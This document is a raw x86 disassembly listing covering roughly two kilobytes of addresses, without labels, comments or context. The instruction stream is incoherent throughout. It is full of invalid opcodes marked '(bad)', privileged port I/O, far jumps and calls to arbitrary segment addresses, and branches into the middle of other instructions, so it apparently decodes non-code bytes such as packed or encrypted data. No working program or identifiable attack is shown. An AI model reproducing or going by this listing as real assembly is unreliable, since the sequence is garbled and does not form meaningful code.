  4151d2:	rcr    DWORD PTR [eax],cl
  4151d4:	mov    ebx,0xd89371b9
  4151d9:	in     eax,0x15
  4151db:	mov    dl,0x91
  4151dd:	test   eax,edx
  4151df:	jmp    0x6c73:0xa4e7ed22
  4151e6:	cmp    BYTE PTR [ebp+0x6c],bh
  4151e9:	aam    0xe9
  4151eb:	pop    edx
  4151ec:	aam    0xa8
  4151ee:	mov    eax,DWORD PTR [edx-0x45]
  4151f1:	test   eax,0x2035239a
  4151f6:	or     al,BYTE PTR [esi*1+0x3c458de7]
  4151fd:	stos   DWORD PTR es:[edi],eax
  4151fe:	outs   dx,DWORD PTR ds:[esi]
  4151ff:	popa   
  415200:	push   ebp
  415201:	popa   
  415202:	push   eax
  415203:	data16 sar dh,cl
  415206:	and    DWORD PTR [ecx+ecx*2-0xc],edi
  41520a:	jns    0x41528b
  41520c:	adc    ah,cl
  41520e:	cmp    BYTE PTR [ebx+0x77c5ba5a],0xda
  415215:	push   edx
  415216:	lahf   
  415217:	jge    0x415286
  415219:	scas   eax,DWORD PTR es:[edi]
  41521a:	enter  0x7ec1,0x8e
  41521e:	fisttp QWORD PTR [ebx+0x59]
  415221:	mov    esp,0xdf9e7e89
  415226:	mov    ah,BYTE PTR [ebx+0x450be340]
  41522c:	shl    DWORD PTR [ebx-0x55e8e808],cl
  415232:	xchg   edx,eax
  415233:	arpl   WORD PTR [esi+0x5207b015],bx
  415239:	sbb    al,0xd3
  41523b:	push   ds
  41523c:	adc    DWORD PTR [ebx],ecx
  41523e:	loope  0x41522a
  415240:	dec    edi
  415241:	ja     0x415232
  415243:	dec    eax
  415244:	lock sar BYTE PTR [eax+0x21],1
  415248:	lea    ecx,[edi+edi*4+0x3]
  41524c:	call   0x71ac:0xec12bbd5
  415253:	push   ebp
  415254:	iret   
  415255:	xchg   dl,dl
  415257:	cmp    ecx,DWORD PTR [esi]
  415259:	fcomp  DWORD PTR [esi]
  41525b:	mov    ?,WORD PTR [ecx-0x17]
  41525e:	bound  ecx,QWORD PTR [edx+0x51a8c840]
  415264:	inc    edi
  415265:	(bad)  [edx-0x7a]
  415268:	sahf   
  415269:	mov    dl,0x42
  41526b:	call   0xfb97:0xc04eb20d
  415272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415273:	mov    WORD PTR [esi+0x36c18972],ss
  415279:	jmp    0x149c:0xfed6775f
  415280:	dec    ecx
  415281:	pushf  
  415282:	mov    al,0x19
  415284:	mov    al,bh
  415286:	loop   0x415300
  415288:	aas    
  415289:	jecxz  0x415304
  41528b:	xchg   ebp,eax
  41528c:	dec    edx
  41528d:	inc    esp
  41528e:	jp     0x415253
  415290:	add    DWORD PTR [esi+ebx*4+0x1b],0x34
  415295:	dec    esi
  415296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415297:	xlat   BYTE PTR ds:[ebx]
  415298:	sub    al,0x21
  41529a:	adc    bl,bl
  41529c:	mov    ds:0xc694d796,eax
  4152a1:	pop    ss
  4152a2:	mov    ebp,0xcc4209a2
  4152a7:	and    ch,dl
  4152a9:	cmp    eax,0x248e9049
  4152ae:	rcr    DWORD PTR [ecx+0x11f2adb4],0x8c
  4152b5:	adc    eax,0x41735d7f
  4152ba:	sub    DWORD PTR [ecx+0x2a],esi
  4152bd:	frstor [ecx-0x65]
  4152c0:	les    eax,FWORD PTR [ebx]
  4152c2:	adc    esp,DWORD PTR [esi]
  4152c4:	leave  
  4152c5:	push   cs
  4152c6:	push   ds
  4152c7:	mov    esp,0x1a69b70
  4152cc:	cmp    eax,0x86fc4c7b
  4152d1:	scas   eax,DWORD PTR es:[edi]
  4152d2:	mov    ecx,0x85aca22a
  4152d7:	dec    edi
  4152d8:	gs pop ecx
  4152da:	idiv   BYTE PTR [ebx]
  4152dc:	fsub   DWORD PTR [esi-0x46]
  4152df:	xor    ebp,DWORD PTR [edx-0x683c34bc]
  4152e5:	in     al,dx
  4152e6:	jns    0x41534e
  4152e8:	xchg   edi,eax
  4152e9:	jno    0x415277
  4152eb:	(bad)  
  4152ec:	xor    eax,0xda33dcfe
  4152f1:	fisub  WORD PTR [ebx+eiz*1]
  4152f4:	xchg   esi,eax
  4152f5:	cdq    
  4152f6:	fsubr  st,st(7)
  4152f8:	or     eax,0x4654f389
  4152fd:	sbb    dh,0xb4
  415300:	xor    ebp,DWORD PTR ds:0xaa9a183a
  415306:	xchg   esi,eax
  415307:	je     0x415382
  415309:	jp     0x41534f
  41530b:	mov    esi,0x689144ee
  415310:	daa    
  415311:	cmc    
  415312:	nop
  415313:	add    esp,esp
  415315:	iret   
  415316:	inc    esp
  415317:	mov    ch,0x18
  415319:	fucom  st(0)
  41531b:	scas   eax,DWORD PTR es:[edi]
  41531c:	outs   dx,DWORD PTR ds:[esi]
  41531d:	cmp    al,0x95
  41531f:	mov    edx,0xa43dc98c
  415324:	mov    ds:0xbdf71057,al
  415329:	pop    ss
  41532a:	out    dx,al
  41532b:	jmp    0xd152:0x732cd9f8
  415332:	pushf  
  415333:	sub    eax,esi
  415335:	vdivsd xmm5,xmm1,xmm3
  415339:	inc    eax
  41533a:	inc    ebp
  41533b:	in     eax,0xfb
  41533d:	jmp    0x415326
  41533f:	mov    eax,ds:0x91ea2c61
  415344:	ja     0x4152c9
  415346:	out    dx,al
  415347:	repz std 
  415349:	or     BYTE PTR [esi+esi*1+0x3f],ch
  41534d:	stc    
  41534e:	lods   eax,DWORD PTR ss:[esi]
  415350:	arpl   WORD PTR [ebx-0x3cbe56b],sp
  415356:	push   eax
  415357:	popf   
  415358:	push   ebp
  415359:	js     0x415316
  41535b:	add    DWORD PTR [esi-0x7b],edi
  41535e:	in     eax,dx
  41535f:	cmp    DWORD PTR [esi-0x33],eax
  415362:	jne    0x41530f
  415364:	retf   0x99a9
  415367:	push   es
  415368:	or     bh,BYTE PTR [edi-0xd]
  41536b:	outs   dx,DWORD PTR ds:[esi]
  41536c:	sbb    DWORD PTR [esi],ecx
  41536e:	hlt    
  41536f:	xchg   ebp,eax
  415370:	xchg   edx,eax
  415371:	mov    ebx,0x7265469c
  415376:	sbb    al,0x5
  415378:	mov    edi,0x30b3fd89
  41537d:	mov    edi,0x566192a8
  415382:	fimul  DWORD PTR [ebx-0x21f111ce]
  415388:	pop    ebx
  415389:	mov    edi,0x375c320a
  41538e:	fwait
  41538f:	mov    cl,BYTE PTR [esi]
  415391:	repnz loope 0x415338
  415394:	aas    
  415395:	xor    edi,ecx
  415397:	add    BYTE PTR [esi-0x7b],cl
  41539a:	repnz in eax,0x7c
  41539d:	into   
  41539e:	iret   
  41539f:	push   esp
  4153a0:	fwait
  4153a1:	inc    esi
  4153a2:	hlt    
  4153a3:	rol    DWORD PTR [ebx+edi*1-0x12],1
  4153a7:	cwde   
  4153a8:	mov    ecx,0x47168d37
  4153ad:	adc    esp,DWORD PTR [ebp+edx*2-0x2b]
  4153b1:	popa   
  4153b2:	dec    ebp
  4153b3:	xor    BYTE PTR [ebx-0xac1d8f5],ch
  4153b9:	xor    BYTE PTR [edi+0x68e44376],ch
  4153bf:	or     BYTE PTR [ebx],cl
  4153c1:	xchg   esp,eax
  4153c2:	dec    eax
  4153c3:	fstp   QWORD PTR [edi]
  4153c5:	push   0xbc69edaf
  4153ca:	mov    eax,cs:0xb24c50af
  4153d0:	mov    al,ds:0x7c25547b
  4153d5:	mov    bl,BYTE PTR [eax]
  4153d7:	fnsave [ebp+0x7f]
  4153da:	inc    ecx
  4153db:	cmp    al,0x44
  4153dd:	clc    
  4153de:	xchg   ebp,eax
  4153df:	fmul   QWORD PTR [ecx+0x3c]
  4153e2:	jl     0x415425
  4153e4:	mov    ah,0x61
  4153e6:	into   
  4153e7:	or     edi,eax
  4153e9:	in     eax,0xae
  4153eb:	sbb    al,0x99
  4153ed:	push   cs
  4153ee:	fmul   st(3),st
  4153f0:	pusha  
  4153f1:	call   0x7a4d:0x7b647e78
  4153f8:	loopne 0x415389
  4153fa:	mov    eax,ds:0xbc1b5015
  4153ff:	in     al,dx
  415400:	and    DWORD PTR [edi],edi
  415402:	fwait
  415403:	bound  ecx,QWORD PTR [bx+0xb6]
  415408:	push   esp
  415409:	or     eax,0xf9bb940c
  41540e:	mov    esp,0x3b3515b1
  415413:	dec    esp
  415414:	loopne 0x4153c9
  415416:	clc    
  415417:	pusha  
  415418:	(bad)  
  415419:	cld    
  41541a:	push   ds
  41541b:	sub    al,0x20
  41541d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41541e:	mov    bl,BYTE PTR [edi-0x2a2599b4]
  415424:	dec    eax
  415425:	jge    0x4153de
  415427:	mov    ebp,0x38214058
  41542c:	test   BYTE PTR es:[ebp+0x24da25c1],bh
  415433:	dec    edi
  415434:	cmp    dl,BYTE PTR ds:0xf995ee03
  41543a:	mov    al,ds:0x982e270e
  41543f:	dec    edx
  415440:	sti    
  415441:	fimul  DWORD PTR [edx+0x18c83bdb]
  415447:	daa    
  415448:	out    0x9e,al
  41544a:	fnstenv [ecx-0x45]
  41544d:	mov    BYTE PTR [ebx],bh
  41544f:	xchg   DWORD PTR [esi],edx
  415451:	sahf   
  415452:	cld    
  415453:	out    0xd4,eax
  415455:	or     dh,BYTE PTR [edx]
  415457:	out    dx,al
  415458:	test   BYTE PTR [eax-0x1573d12b],ah
  41545e:	ss (bad) 
  415460:	mov    eax,0x3b3b955a
  415465:	sub    al,cl
  415467:	push   bx
  415469:	cmp    cl,dl
  41546b:	cli    
  41546c:	sbb    eax,0x27a41212
  415471:	jno    0x415473
  415473:	popa   
  415474:	bound  edi,QWORD PTR [esi]
  415476:	aaa    
  415477:	in     al,dx
  415478:	cs xchg ebp,eax
  41547a:	es adc al,0xfd
  41547d:	lods   al,BYTE PTR ds:[esi]
  41547e:	outs   dx,DWORD PTR ds:[esi]
  41547f:	cmp    DWORD PTR [edi-0xbda7f47],ebp
  415485:	sbb    al,0xd4
  415487:	mov    ebp,0x7a9ea598
  41548c:	or     esp,DWORD PTR [edx-0x3f]
  41548f:	xchg   DWORD PTR [eax+0x6982e5fe],ebx
  415495:	push   ds
  415496:	xor    DWORD PTR [esp+ebx*4],ebp
  415499:	das    
  41549a:	xor    DWORD PTR [edi],esi
  41549c:	cmp    DWORD PTR es:[ebx-0x7bc9f9a1],ebp
  4154a3:	ja     0x41548c
  4154a5:	and    dl,BYTE PTR [ebx+0x55]
  4154a8:	rol    esp,1
  4154aa:	mov    eax,0x94907aaf
  4154af:	sbb    BYTE PTR [eax+eax*4-0x53431f59],0xc0
  4154b7:	fucomp st(4)
  4154b9:	xchg   edx,eax
  4154ba:	repnz enter 0x5d8c,0xed
  4154bf:	dec    edx
  4154c0:	psubb  mm3,mm7
  4154c3:	ins    DWORD PTR es:[edi],dx
  4154c4:	pop    es
  4154c5:	dec    ecx
  4154c6:	leave  
  4154c7:	fdivr  DWORD PTR [edi]
  4154c9:	jle    0x41551b
  4154cb:	outs   dx,DWORD PTR ds:[esi]
  4154cc:	(bad)  
  4154cd:	cs mov eax,0x27f3554d
  4154d3:	loope  0x4154dd
  4154d5:	test   DWORD PTR [ebx+0x33],0x631db466
  4154dc:	lds    ebx,FWORD PTR [edi+0x4d]
  4154df:	xchg   esi,eax
  4154e0:	sahf   
  4154e1:	ins    DWORD PTR es:[edi],dx
  4154e2:	ins    DWORD PTR es:[edi],dx
  4154e3:	or     dl,BYTE PTR [edx-0xf]
  4154e6:	popa   
  4154e7:	mov    ebx,0x306ffb71
  4154ec:	iret   
  4154ed:	jo     0x415567
  4154ef:	adc    al,0x19
  4154f1:	sbb    eax,0xbc813f51
  4154f6:	popa   
  4154f7:	ja     0x41548c
  4154f9:	ffree  st(3)
  4154fb:	dec    edi
  4154fc:	shr    edx,1
  4154fe:	xchg   ebx,eax
  4154ff:	repnz adc eax,0xbd20a9fb
  415505:	xlat   BYTE PTR ds:[ebx]
  415506:	sbb    cl,dh
  415508:	pop    es
  415509:	adc    esi,DWORD PTR [ecx]
  41550b:	add    BYTE PTR [ebx],dl
  41550d:	dec    esi
  41550e:	push   edx
  41550f:	jb     0x4154b7
  415511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415512:	push   esp
  415513:	pop    eax
  415514:	sbb    eax,0xbbccd3c2
  415519:	dec    edi
  41551a:	je     0x4154a2
  41551c:	cmp    ebx,DWORD PTR [edx+0x6c]
  41551f:	int    0xc1
  415521:	mov    esi,0x9e811672
  415526:	ror    DWORD PTR [esi+0x68e5aef1],1
  41552c:	adc    bh,cl
  41552e:	fistp  QWORD PTR [edx-0x48]
  415531:	sub    al,0xb2
  415533:	sahf   
  415534:	push   cs
  415535:	xchg   edx,eax
  415536:	jnp    0x415557
  415538:	jmp    0x9c20:0x52e9b78f
  41553f:	push   ebx
  415540:	pop    DWORD PTR [ecx+0x43]
  415543:	int3   
  415544:	das    
  415545:	sub    al,0xe0
  415547:	mov    bl,0x1f
  415549:	pop    ecx
  41554a:	enter  0xadd,0x71
  41554e:	rcr    BYTE PTR [ebp+0xe],0xf
  415552:	popa   
  415553:	xchg   BYTE PTR [ebx+0xa],al
  415556:	jmp    0x4155be
  415558:	add    ch,BYTE PTR [ebx]
  41555a:	push   esi
  41555b:	pop    esp
  41555c:	call   0x1d082cc4
  415561:	es inc ecx
  415563:	in     eax,dx
  415564:	dec    edx
  415565:	aad    0x42
  415567:	sub    al,0xa3
  415569:	and    al,0xe6
  41556b:	out    0x9f,eax
  41556d:	push   ds
  41556e:	int    0xd8
  415570:	data16 rcr BYTE PTR [esi+eiz*1+0x4d],cl
  415575:	nop
  415576:	push   es
  415577:	inc    ebx
  415578:	inc    ecx
  415579:	outs   dx,BYTE PTR ds:[esi]
  41557a:	test   al,0xd5
  41557c:	or     al,0x9b
  41557e:	sbb    DWORD PTR [ebp+0x8dc0168],edi
  415584:	out    0xcd,al
  415586:	pop    ebp
  415587:	jge    0x4155af
  415589:	bound  ebp,QWORD PTR [esp+edx*8+0x60400a82]
  415590:	loope  0x4155c6
  415592:	cmc    
  415593:	mov    esp,0x79a3d52
  415598:	and    DWORD PTR [ecx-0xf0ca98c],edi
  41559e:	pop    ds
  41559f:	shl    BYTE PTR [edi+0x6bf9f784],1
  4155a5:	xchg   esp,eax
  4155a6:	adc    eax,edi
  4155a8:	push   ebp
  4155a9:	pop    DWORD PTR [ebx-0x28eea9e9]
  4155af:	aas    
  4155b0:	pop    ecx
  4155b1:	leave  
  4155b2:	adc    cl,BYTE PTR [ecx]
  4155b4:	pushf  
  4155b5:	adc    eax,0x31834f9b
  4155ba:	pushf  
  4155bb:	push   0xffffffdf
  4155bd:	fs and eax,0xda41c92a
  4155c3:	and    ebx,DWORD PTR [eax+ecx*2-0x32]
  4155c7:	cld    
  4155c8:	(bad)  
  4155c9:	mov    dl,0x19
  4155cb:	add    bl,bh
  4155cd:	(bad)  
  4155ce:	sti    
  4155cf:	dec    esp
  4155d0:	xor    eax,0xf8d65d57
  4155d5:	or     eax,0xfee2d6f8
  4155da:	dec    ecx
  4155db:	sub    BYTE PTR [ecx-0x24],ch
  4155de:	mov    esp,0xc538252b
  4155e3:	into   
  4155e4:	and    DWORD PTR [ecx-0xeb324df],ebp
  4155ea:	daa    
  4155eb:	(bad)  
  4155ec:	xchg   edx,eax
  4155ed:	lods   al,BYTE PTR ds:[esi]
  4155ee:	(bad)  
  4155f0:	jmp    eax
  4155f2:	xchg   ebx,eax
  4155f3:	xor    BYTE PTR [ebp+0x1d001271],ah
  4155f9:	jo     0x41566a
  4155fb:	nop
  4155fc:	sar    bh,1
  4155fe:	fcmovu st,st(6)
  415600:	retf   
  415601:	and    dh,BYTE PTR [ebx+0xa]
  415604:	cmp    DWORD PTR [edi-0x4455079b],ebx
  41560a:	jl     0x415685
  41560c:	ficom  DWORD PTR [ebx-0x1d]
  41560f:	adc    edx,DWORD PTR [ebp-0x18]
  415612:	add    BYTE PTR [ebx+0x5e],ah
  415615:	and    BYTE PTR [edx+0x4a],0x89
  415619:	xor    DWORD PTR [eax],ecx
  41561b:	fmul   DWORD PTR [edi]
  41561d:	fwait
  41561e:	shr    BYTE PTR ds:0x7f23824d,1
  415624:	jl     0x41568e
  415626:	or     al,BYTE PTR [ecx-0x227f1403]
  41562c:	push   cs
  41562d:	cdq    
  41562e:	call   0xca9b:0x28290ffe
  415635:	dec    esp
  415636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415637:	sahf   
  415638:	push   cs
  415639:	mov    cl,0x3e
  41563b:	xor    al,0xc3
  41563d:	sbb    eax,0xfdbc504c
  415642:	lods   eax,DWORD PTR ds:[esi]
  415643:	add    BYTE PTR [ebp+0x7762dbdb],dl
  415649:	in     eax,dx
  41564a:	adc    ecx,DWORD PTR [edi+edx*1-0x16e5cb2c]
  415651:	mov    eax,0xd1d79111
  415656:	fisttp QWORD PTR [ebx+0x63]
  415659:	jo     0x415639
  41565b:	dec    esp
  41565d:	jmp    0x415665
  41565f:	jl     0x415683
  415661:	push   eax
  415662:	cmp    ebx,DWORD PTR [ecx]
  415664:	mov    edi,0x1329bdce
  415669:	cdq    
  41566a:	pop    ebp
  41566b:	sbb    DWORD PTR [ebx-0x3e236705],ebp
  415671:	out    dx,eax
  415672:	icebp  
  415673:	xchg   edi,eax
  415674:	lds    esi,FWORD PTR [edi-0x30]
  415677:	xchg   DWORD PTR [edx],ecx
  415679:	rcl    BYTE PTR [esi+0x1cba4ced],1
  41567f:	mov    cl,BYTE PTR [ebx]
  415681:	pop    ss
  415682:	call   0x22cc:0x42618593
  415689:	adc    ah,BYTE PTR [bp+0x2b]
  41568d:	retf   
  41568e:	xchg   ebp,eax
  41568f:	jmp    0x4156ea
  415691:	fs mov ecx,0xf7514818
  415697:	and    ch,dh
  415699:	jbe    0x415668
  41569b:	cmp    eax,0xc8cdffb5
  4156a0:	aas    
  4156a1:	jmp    DWORD PTR [esi+eax*2+0x1fcaba28]
  4156a8:	lahf   
  4156a9:	push   cs
  4156aa:	cmc    
  4156ab:	fisttp WORD PTR [eax-0x5]
  4156ae:	pop    DWORD PTR [edi+ecx*1]
  4156b1:	inc    esp
  4156b2:	iret   
  4156b3:	in     al,0x9
  4156b5:	mov    ebx,ebx
  4156b7:	enter  0x221a,0xa3
  4156bb:	cwde   
  4156bc:	mov    dl,0x7f
  4156be:	leave  
  4156bf:	ror    DWORD PTR [ebx],1
  4156c1:	mov    ecx,DWORD PTR [esi]
  4156c3:	stos   DWORD PTR es:[edi],eax
  4156c4:	sbb    al,0xf1
  4156c6:	sbb    BYTE PTR [ebx-0x7],dh
  4156c9:	pushf  
  4156ca:	push   eax
  4156cb:	xchg   ecx,eax
  4156cc:	into   
  4156cd:	mov    edi,0x66d7bb1f
  4156d2:	sbb    al,0x50
  4156d4:	aad    0x38
  4156d6:	adc    DWORD PTR [ecx],0xbf4440f7
  4156dc:	or     eax,0x78aaa0d8
  4156e1:	(bad)  
  4156e2:	push   eax
  4156e3:	fimul  DWORD PTR [edx-0x50e5d5c8]
  4156e9:	out    0xd6,eax
  4156eb:	icebp  
  4156ec:	cwde   
  4156ed:	sub    DWORD PTR [edi+0x3f],edx
  4156f0:	cwde   
  4156f1:	sbb    al,0x12
  4156f3:	imul   ebx,DWORD PTR [edi-0x7],0x2744faa
  4156fa:	inc    eax
  4156fb:	push   edx
  4156fc:	sub    al,0x99
  4156fe:	clc    
  4156ff:	pop    edi
  415700:	jbe    0x4156df
  415702:	jmp    0x3670:0x234e005e
  415709:	or     al,0xf5
  41570b:	sbb    al,bl
  41570d:	mov    WORD PTR [edi-0x1443b0b2],fs
  415713:	jne    0x4156d0
  415715:	push   esp
  415716:	sbb    ecx,DWORD PTR [esi+0x44]
  415719:	cmp    ah,BYTE PTR [ebp+0x52c4754f]
  41571f:	fcom   st(6)
  415721:	and    ebx,ecx
  415723:	call   0xad12:0x15a7301c
  41572a:	stos   BYTE PTR es:[edi],al
  41572b:	rcr    BYTE PTR [edx],0x74
  41572e:	mov    edi,0xc48d53e3
  415733:	add    al,0x3b
  415735:	loop   0x41575e
  415737:	mov    ebp,0x27509a1d
  41573c:	fcomp  QWORD PTR [ebx]
  41573e:	xchg   edx,eax
  41573f:	sbb    ebp,DWORD PTR [ecx-0x48]
  415742:	mov    WORD PTR [ebx+esi*1-0x78],?
  415746:	jb     0x41571d
  415748:	ja     0x415751
  41574a:	stos   BYTE PTR es:[edi],al
  41574b:	loopne 0x41575e
  41574d:	fst    QWORD PTR [ebp-0x4503cad5]
  415753:	shr    al,cl
  415755:	jne    0x4156eb
  415757:	jmp    0x4156f6
  415759:	sub    edi,DWORD PTR [edx-0x4a]
  41575c:	xchg   dh,bh
  41575e:	in     al,0xd2
  415760:	ins    DWORD PTR es:[edi],dx
  415761:	mov    dl,BYTE PTR [edi+eiz*1+0x7f1ec028]
  415768:	mov    ecx,0xfd004494
  41576d:	retf   
  41576e:	hlt    
  41576f:	sub    ebp,DWORD PTR [ecx]
  415771:	cmp    bh,BYTE PTR [ecx+0x67]
  415774:	lahf   
  415775:	lahf   
  415776:	mov    ch,0xa2
  415778:	jge    0x4157a8
  41577a:	call   0xfd357a3
  41577f:	or     ecx,ecx
  415781:	jmp    0x4157c8
  415783:	push   edx
  415784:	out    0xef,al
  415786:	fld    QWORD PTR ss:[ecx]
  415789:	xchg   esi,eax
  41578a:	jmp    0x683a1541
  41578f:	(bad)  
  415790:	scas   al,BYTE PTR es:[edi]
  415791:	test   eax,0xa2413288
  415796:	pop    esi
  415797:	mov    WORD PTR [esi],ss
  415799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41579a:	push   cs
  41579b:	jno    0x4157c0
  41579d:	lods   al,BYTE PTR ds:[esi]
  41579e:	in     eax,dx
  41579f:	mov    WORD PTR [ecx],cs
  4157a1:	mov    DWORD PTR [edi+0x62],0x414215a7
  4157a8:	add    eax,0xacc35c95
  4157ad:	call   0xea543802
  4157b2:	fstp   TBYTE PTR [ebx-0x5d2831b]
  4157b8:	pop    ss
  4157b9:	jns    0x4157b9
  4157bb:	mov    ds:0x7ef3ba61,al
  4157c0:	inc    edi
  4157c1:	out    dx,al
  4157c2:	fwait
  4157c3:	or     DWORD PTR [ecx+0x7450c545],ecx
  4157c9:	or     dl,BYTE PTR [ebp-0x57]
  4157cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ce:	stc    
  4157cf:	pop    edx
  4157d0:	and    DWORD PTR [esi],ebx
  4157d2:	(bad)  
  4157d3:	retf   
  4157d4:	xor    BYTE PTR [edx+edi*2-0x7e],0x14
  4157d9:	std    
  4157da:	adc    bl,BYTE PTR [edx+0xa]
  4157dd:	stc    
  4157de:	sub    eax,ecx
  4157e0:	inc    eax
  4157e1:	out    dx,al
  4157e2:	xchg   esp,eax
  4157e3:	sbb    BYTE PTR [ebx+eiz*1-0x3e],bh
  4157e7:	ret    0x6c10
  4157ea:	fs jnp 0x415794
  4157ed:	push   ecx
  4157ee:	jmp    0x89ed1220
  4157f3:	icebp  
  4157f4:	clc    
  4157f5:	loop   0x41582e
  4157f7:	inc    esi
  4157f8:	ret    
  4157f9:	pop    es
  4157fa:	int    0x52
  4157fc:	in     al,dx
  4157fd:	xor    DWORD PTR [ebp-0x14],ebx
  415800:	not    BYTE PTR [ebp-0x7102b6c8]
  415806:	std    
  415807:	lds    ebx,FWORD PTR [ebx]
  415809:	mov    al,0xbe
  41580b:	imul   edi,DWORD PTR [edx+0x76],0x65
  41580f:	cdq    
  415810:	push   ebp
  415811:	or     BYTE PTR [eax+0x7f],dl
  415814:	mov    ah,0xb5
  415816:	mov    ds:0x23c3fd0d,al
  41581b:	outs   dx,DWORD PTR ds:[esi]
  41581c:	fidiv  WORD PTR [edx+0x58]
  41581f:	(bad)  
  415820:	mov    ?,WORD PTR ds:0xb84908cd
  415826:	pushf  
  415827:	dec    edi
  415828:	or     dh,BYTE PTR [edx]
  41582a:	inc    ebp
  41582b:	ins    BYTE PTR es:[edi],dx
  41582c:	sbb    al,0x15
  41582e:	lods   eax,DWORD PTR ds:[esi]
  41582f:	jge    0x4157f0
  415831:	mov    edx,0xfe85d7f6
  415836:	dec    esp
  415837:	or     cl,BYTE PTR [ebx]
  415839:	mov    ebp,edx
  41583b:	fisub  DWORD PTR [ecx+0x34d2aae8]
  415841:	mov    edx,DWORD PTR [eax+0x2]
  415844:	call   0x6e80:0x101eba20
  41584b:	repz lock syscall 
  41584f:	ret    0xe855
  415852:	jno    0x415815
  415854:	rcr    bl,0x8a
  415857:	aad    0x56
  415859:	test   al,0x56
  41585b:	ror    eax,0xfd
  41585e:	in     al,dx
  41585f:	adc    esi,DWORD PTR [ecx]
  415861:	clc    
  415862:	mov    cl,0x16
  415864:	scas   eax,DWORD PTR es:[edi]
  415865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415866:	adc    ebp,DWORD PTR [ebp+0x6c]
  415869:	push   ebp
  41586a:	and    DWORD PTR [ebp+0x3266eb33],esp
  415870:	push   eax
  415871:	(bad)  
  415872:	pop    ebp
  415873:	test   dl,ch
  415875:	adc    ebp,DWORD PTR [edi+0x50]
  415878:	and    ch,cl
  41587a:	mov    edi,edx
  41587c:	and    bl,BYTE PTR [edi]
  41587e:	dec    esi
  41587f:	xchg   BYTE PTR [edi+ebx*1-0x4b],cl
  415883:	pop    ss
  415884:	and    BYTE PTR [edx+0x76db0782],al
  41588a:	or     esp,DWORD PTR [ecx-0x4b]
  41588d:	adc    al,0x39
  41588f:	in     al,0xe8
  415891:	fisttp WORD PTR [ebx]
  415893:	bswap  ebp
  415895:	inc    edi
  415896:	dec    edi
  415897:	dec    ebx
  415898:	xor    DWORD PTR [ebp+0x3836ac5a],esi
  41589e:	or     DWORD PTR [ebp-0x63f2405a],eax
  4158a4:	push   es
  4158a5:	pop    ds
  4158a6:	mov    BYTE PTR [esp+esi*4],bh
  4158a9:	jns    0x4158ce
  4158ab:	dec    edx
  4158ac:	(bad)  
  4158ad:	fcmovbe st,st(4)
  4158af:	and    al,0xb3
  4158b1:	pop    ecx
  4158b2:	add    BYTE PTR [ebx-0x1f],bh
  4158b5:	lods   al,BYTE PTR ds:[esi]
  4158b6:	fsqrt  
  4158b8:	or     DWORD PTR [esi+0x37],ecx
  4158bb:	xchg   ebp,eax
  4158bc:	xor    DWORD PTR [esi],0x394cc9b3
  4158c2:	retf   
  4158c3:	sbb    al,0xae
  4158c5:	addr16 daa 
  4158c7:	div    BYTE PTR [esi+0x6f7eecf3]
  4158cd:	xor    BYTE PTR [ecx],cl
  4158cf:	mov    ds:0x62f59009,al
  4158d4:	jl     0x41591b
  4158d6:	mov    ds:0x4dc38644,eax
  4158db:	cmp    edx,DWORD PTR [ebp-0x6e]
  4158de:	add    BYTE PTR [edx],ah
  4158e0:	iret   
  4158e1:	sbb    esp,DWORD PTR [eax*8-0x279902b3]
  4158e8:	and    ebx,DWORD PTR [esi-0x3b]
  4158eb:	mov    ch,0x53
  4158ed:	dec    eax
  4158ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158ef:	xchg   esi,eax
  4158f0:	inc    ebp
  4158f1:	lods   eax,DWORD PTR ds:[esi]
  4158f2:	push   ds
  4158f3:	data16 add cl,cl
  4158f6:	mov    bl,BYTE PTR [ebp+0x54]
  4158f9:	out    dx,al
  4158fa:	and    BYTE PTR [edi+0x7f2e0e68],al
  415900:	mov    ch,0x9
  415902:	mov    dh,0x4
  415904:	adc    edx,DWORD PTR [edx]
  415906:	xchg   ebp,eax
  415907:	jbe    0x41589e
  415909:	adc    BYTE PTR [ebx+eax*1],ah
  41590c:	dec    edx
  41590d:	in     al,dx
  41590e:	lods   al,BYTE PTR ds:[esi]
  41590f:	mov    edx,0x55c30855
  415914:	cmp    DWORD PTR [edi+0x3eed7a],esp
  41591a:	xchg   BYTE PTR [edi+edx*4],bh
  41591d:	fstp   QWORD PTR [esi+0x14f4d52e]
  415923:	dec    edx
  415924:	jb     0x4158d2
  415926:	pop    ss
  415927:	or     ebx,DWORD PTR [ecx+edi*8]
  41592a:	in     al,0x81
  41592c:	mov    eax,ds:0x720caa3c
  415931:	mov    eax,0x2f5e9342
  415936:	add    ebx,DWORD PTR [ebx-0x5c106af9]
  41593c:	loope  0x4158cf
  41593e:	pushf  
  41593f:	push   cs
  415940:	dec    ebx
  415941:	or     bh,al
  415943:	cli    
  415944:	outs   dx,DWORD PTR ds:[esi]
  415945:	shr    BYTE PTR ds:0x5326d88d,1
  41594b:	ds xor eax,0x86500e44
  415951:	fisttp WORD PTR [ecx]
  415953:	mov    al,cl
  415955:	mov    ebx,0x61460a27
  41595a:	or     DWORD PTR [edi-0x5990436e],ebp
  415960:	pop    edx
  415961:	stc    
  415962:	dec    eax
  415963:	sbb    al,0x1b
  415965:	ffree  st(6)
  415967:	pop    ds
  415968:	sub    dh,dh
  41596a:	and    al,0x7b
  41596c:	test   dl,0x7c
  41596f:	inc    edi
  415970:	adc    eax,0x94122e46
  415975:	cwde   
  415976:	pop    esi
  415977:	push   es
  415978:	pop    eax
  415979:	xor    DWORD PTR [ecx-0x35c575cb],0x17
  415980:	or     al,0x36
  415982:	scas   eax,DWORD PTR es:[edi]
  415983:	fcmovne st,st(2)
  415985:	pop    eax
  415986:	xchg   esi,eax
  415987:	and    bh,BYTE PTR [edx+ecx*1]
  41598a:	pop    edi
  41598b:	imul   ecx,ecx,0x5ddb2ae8
  415991:	dec    al
  415993:	inc    ebp
  415994:	inc    esi
  415995:	jl     0x4159a1
  415997:	(bad)  
  415998:	neg    dh
  41599a:	and    ch,bh
  41599c:	and    eax,DWORD PTR [ebx-0x431dd0f7]
  4159a2:	cmp    al,0x35
